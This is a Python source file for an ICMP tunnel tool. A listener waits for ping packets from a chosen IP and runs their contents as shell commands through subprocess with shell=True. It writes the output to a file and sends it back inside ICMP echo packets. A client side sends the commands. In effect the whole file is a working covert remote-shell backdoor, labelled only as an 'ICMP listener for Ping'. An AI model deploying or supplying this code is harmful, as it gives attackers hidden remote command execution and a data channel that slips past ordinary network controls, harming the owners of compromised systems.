import socket
import struct
import subprocess
import random
from argparse import ArgumentParser

ICMP_BUFFER_SIZE = 65565
SIGNAL_SUBSTRING = b'ENDOFREQUEST'
ICMP_ECHO_REQUEST_CLIENT = 8
ICMP_ECHO_REQUEST_SERVER = 0

class ICMP:
    @staticmethod
    def checksum(source_string):
        sum = 0
        count_to = (len(source_string) // 2) * 2

        for count in range(0, count_to, 2):
            this_val = source_string[count + 1] * 256 + source_string[count]
            sum = sum + this_val
            sum = sum & 0xffffffff

        if count_to < len(source_string):
            sum = sum + source_string[-1]
            sum = sum & 0xffffffff

        sum = (sum >> 16) + (sum & 0xffff)
        sum = sum + (sum >> 16)
        answer = ~sum & 0xffff
        answer = (answer >> 8) | ((answer << 8) & 0xff00)
        return answer

    @staticmethod
    def create_packet(packet_id, data: bytes, sender_type: str):
        icmp_type = ICMP_ECHO_REQUEST_CLIENT if sender_type == "client" else ICMP_ECHO_REQUEST_SERVER
        data = data + SIGNAL_SUBSTRING
        header = struct.pack('bbHHh', icmp_type, 0, 0, packet_id, 1)
        my_checksum = ICMP.checksum(header + data)
        header = struct.pack('bbHHh', icmp_type, 0, socket.htons(my_checksum), packet_id, 1)
        return header + data

    @staticmethod
    def parse_packet(packet):
        icmp_header = packet[20:28]
        icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq = struct.unpack("bbHHh", icmp_header)
        icmp_data = packet[28:]
        return icmp_data, icmp_id

class BaseICMPHandler:
    def __init__(self, ip):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except socket.error as e:
            raise RuntimeError(f"Socket creation failed: {e}")
        self.ip = ip

    def send(self, data: bytes):
        packet_id = random.randint(0, 65535)
        packet = ICMP.create_packet(packet_id, data, self.sender_type)

        while packet:
            sent = self.sock.sendto(packet, (self.ip, 1))
            packet = packet[sent:]

    def listen(self):
        data = b''
        run = True

        while run:
            packet, addr = self.sock.recvfrom(1024)
            if addr[0] == self.ip:
                icmp_data, icmp_id = ICMP.parse_packet(packet)
                if SIGNAL_SUBSTRING in icmp_data:
                    run = False
                data += icmp_data
                print(f"[+] Received data from {addr[0]}: {icmp_data}")
        return data.replace(SIGNAL_SUBSTRING, b"")

class Server(BaseICMPHandler):
    sender_type = "server"

    def __init__(self, src_ip, output_file):
        super().__init__(src_ip)
        self.output_file = output_file

    def write_output(self, data):
        print(f"Received data: {data}")

    def main_func(self):
        data = self.listen()
        self.write_output(data)

        payload = Payload(data, self.output_file)
        output = payload.exec_payload()
        self.send(output)

class Client(BaseICMPHandler):
    sender_type = "client"

    def main_func(self, command):
        self.send(str.encode(command))
        data = self.listen()
        print(f"Received data: {data.decode('utf-8')}")

class Payload:
    def __init__(self, payload, output_file):
        self.payload = payload
        self.output_file = output_file

    def exec_payload(self):
        try:
            p = subprocess.Popen(self.payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            outs, errs = p.communicate(timeout=15)
        except subprocess.TimeoutExpired:
            p.kill()
            outs, errs = p.communicate()

        with open(self.output_file, "w") as f:
            f.write(outs.decode('utf-8'))

        return outs

if __name__ == '__main__':
    parser = ArgumentParser(description='ICMP listener for Ping')
    parser.add_argument('-o', '--output', default='output.txt', type=str, help='Output file')
    parser.add_argument('-s', '--src-ip', type=str, help='Source IP of ICMP sender')
    parser.add_argument('-d', '--dst-ip', type=str, help='Destination IP of ICMP recipient')
    parser.add_argument('-c', '--command', type=str, help='Command to execute')
    args = parser.parse_args()

    if args.src_ip:
        server = Server(args.src_ip, args.output)
        server.main_func()
    elif args.dst_ip and args.command:
        client = Client(args.dst_ip)
        client.main_func(args.command)
    else:
        print("Enter proper values")
